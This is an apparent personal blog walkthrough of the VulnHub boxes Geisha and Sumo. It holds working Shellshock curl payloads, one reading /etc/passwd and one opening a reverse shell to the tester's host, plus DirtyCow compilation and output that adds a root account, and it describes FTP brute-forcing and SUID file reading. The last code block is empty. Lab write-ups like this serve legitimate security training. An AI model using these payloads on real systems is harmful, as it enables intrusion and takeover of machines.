## Sumo and Geisha
I decided to do some more of the [SunCSR Team](https://www.vulnhub.com/author/suncsr-team,696/) boxes on VulnHub because I saw someone talking them up; I had done a couple already. It wasn't easy though - although not for the reasons you might think.

#### VMWare
I used to use VMWare for my Kali but every few months it would just randomly nuke my box and I'd have to reinstall. Since I built my new PC, I only had VirtualBox and it has been *seamless*. 

But ... some of the SunCSR boxes are marked as working better with VMWare and I couldn't get them to get an IP with VirtualBox like I normally would. So, I installed VMWare ... and what a pain in the ass that turned out to be, for various reasons. 

Anyway, I did Geisha with both Kali and Geisha in VMWare, then I got Sumo to run in VirtualBox. So far I can't get BlueSky to run at all. I mean it boots okay, but I can't connect to it.

## Geisha
This will be brief. It has like 5 different HTTP ports, plus FTP (no anonymous) and SSH. While I'm enumerating the various HTTP services, I have Hydra running against FTP with a username I found on one of the pages - the *passwd* file is on the webserver. Despite having a vulnerable webapp on two on the ports, I can't find the login page - suggesting it may be a red herring. Hydra finds a password for our user, and we can use this for both FTP and SSH.

Once on, *base32* has the SUID bit (thanks *linpeas*) and we can use it to read files. I read the shadow file but can't crack the hash; so I use it to get the root SSH key and SSH in as *root*; done.

## Sumo
HTTP and SSH only. Web enumeration reveals a */cgi-bin* directory so I add *sh* and *cgi* to my extensions:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/vulnhub/sumo]
â””â”€# feroxbuster -u http://192.168.1.104 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,sh,cgi

# snip
200        1l        3w        0c http://192.168.1.104/cgi-bin/test.sh
# snip
{% endhighlight %}

Smells like *shellshock*? 

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/vulnhub/sumo]
â””â”€# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.1.104/cgi-bin/test.sh               3 â¨¯

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# snip
{% endhighlight %}

Yep. Shell:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/vulnhub/sumo]
â””â”€# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.210/1234 0>&1'" http://192.168.1.104/cgi-bin/test.sh
{% endhighlight %}

This box has an old kernel, and *linux-exploit-suggester.sh* suggests **DirtyCow**. This shit never works for me, but we'll try:

{% highlight shell %}
www-data@ubuntu:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
{% endhighlight %}

HA! I've seen this before:

{% highlight shell %}
www-data@ubuntu:/dev/shm$ export PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
www-data@ubuntu:/dev/shm$ !12
!12
gcc -pthread dirty.c -o dirty -lcrypt
www-data@ubuntu:/dev/shm$
{% endhighlight %}

That's better.

{% highlight shell %}
www-data@ubuntu:/dev/shm$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: none

Complete line:
firefart:fixrfs1bF52dQ:0:0:pwned:/root:/bin/bash

{% endhighlight %}

It appears to have hung at this point - dammit! Let's try another login:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/vulnhub/sumo]

Well there you go, I guess it does work sometimes.
